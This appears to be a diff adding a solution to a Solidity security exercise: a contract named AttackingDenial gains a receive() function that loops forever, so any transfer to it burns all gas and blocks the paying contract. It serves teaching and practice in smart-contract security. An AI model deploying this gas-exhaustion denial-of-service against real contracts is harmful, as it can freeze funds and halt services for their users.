@@ -10,4 +10,10 @@ contract AttackingDenial {
     }
 
     //Code me!
+      receive() external payable {
+        bool x;
+        while (x!= true){
+            
+        }
+      }
 }
